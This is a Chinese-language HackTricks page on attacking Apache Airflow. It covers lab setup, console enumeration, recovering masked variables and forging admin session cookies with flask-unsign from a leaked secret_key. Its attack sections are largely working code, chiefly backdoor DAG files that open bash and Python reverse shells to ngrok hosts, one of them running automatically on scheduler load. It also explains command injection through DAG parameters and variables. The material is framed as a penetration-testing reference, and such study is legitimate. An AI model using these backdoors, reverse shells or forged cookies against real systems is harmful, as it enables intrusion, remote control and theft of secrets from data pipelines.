# Apache Airflow 安全

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 基本信息

[**Apache Airflow**](https://airflow.apache.org) 用于**调度和编排数据管道或工作流**。数据管道的编排是指从不同来源**对复杂数据管道进行排序、协调、调度和管理**。这些数据管道提供的数据集可以被商业智能应用程序和数据科学、支持大数据应用的机器学习模型使用。

基本上，Apache Airflow 允许您在**发生某些事件或定时任务时**，**调度代码的执行**。

## 本地实验室

### Docker-Compose

您可以使用来自 [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) 的 **docker-compose 配置文件**启动完整的 Apache Airflow Docker 环境。（如果您使用的是 MacOS，请确保为 Docker 虚拟机分配至少 6GB 的 RAM）。

### Minikube

运行 Apache Airflow 的一种简单方法是使用 minikube 运行它：
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow配置

Airflow可能会在其配置中存储**敏感信息**，或者您可能会发现存在弱配置：

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

在开始攻击Airflow之前，您应该了解**权限如何工作**：

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## 攻击

### Web控制台枚举

如果您可以**访问Web控制台**，您可能能够访问以下一些或全部信息：

* **变量**（自定义敏感信息可能存储在此处）
* **连接**（自定义敏感信息可能存储在此处）
* 在`http://<airflow>/connection/list/`中访问它们
* [**配置**](./#airflow-configuration)（敏感信息，如**`secret_key`**和密码可能存储在此处）
* 列出**用户和角色**
* **每个DAG的代码**（可能包含有趣的信息）

### 检索变量值

Airflow可以存储变量，以便**DAG**可以**访问**它们的值。这类似于其他平台的密钥。如果您具有**足够的权限**，可以在GUI中的`http://<airflow>/variable/list/`中访问它们。\
默认情况下，Airflow将在GUI中显示变量的值，但是根据[**这里**](https://marclamberti.com/blog/variables-with-apache-airflow/)的说明，可以设置一个**变量列表**，其中**值**将显示为**星号**在**GUI**中。

![](<../../.gitbook/assets/image (79).png>)

然而，这些**值**仍然可以通过**CLI**（需要具有数据库访问权限）、**任意DAG**执行、**API**访问变量端点（需要激活API），甚至是**GUI本身**来检索。\
要从GUI中访问这些值，只需**选择要访问的变量**，然后**点击操作 -> 导出**。\
另一种方法是通过执行**暴力破解**来获取**隐藏值**，使用**搜索过滤**直到找到它为止：

![](<../../.gitbook/assets/image (30).png>)

### 权限提升

如果将**`expose_config`**配置设置为**True**，从**用户角色**及以上的角色可以在Web中**读取**配置。在此配置中，出现了**`secret_key`**，这意味着任何具有此有效密钥的用户都可以**创建自己的签名cookie来冒充任何其他用户帐户**。
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG后门（在Airflow worker中执行远程命令执行）

如果您对保存DAG的位置具有**写访问权限**，您可以**创建一个DAG**，该DAG将向您发送一个**反向shell**。\
请注意，此反向shell将在**airflow worker容器**中执行：
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG后门（在Airflow调度器中的远程代码执行）

如果你将某个东西设置为在**代码的根目录中执行**，在撰写本文时，它将在将其放入DAG文件夹后的几秒钟后由调度器**执行**。
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG创建

如果您成功**入侵DAG集群中的一台机器**，您可以在`dags/`文件夹中创建新的**DAG脚本**，并且它们将被**复制到DAG集群中的其他机器**。

### DAG代码注入

当您从GUI执行DAG时，可以向其**传递参数**。\
因此，如果DAG的编码不正确，它可能**容易受到命令注入攻击**。\
这就是此CVE中发生的情况：[https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

您需要知道的**开始在DAG中寻找命令注入漏洞**的所有内容是，**参数**是通过代码**`dag_run.conf.get("param_name")`**进行**访问**的。

此外，相同的漏洞可能会出现在**变量**中（请注意，如果具有足够的权限，您可以在GUI中**控制变量的值**）。变量是通过以下方式进行**访问**的：
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
如果它们例如被用在一个bash命令中，你可以执行命令注入攻击。

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果你想看到你的**公司在HackTricks中被广告**，或者如果你想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享你的黑客技巧。**

</details>
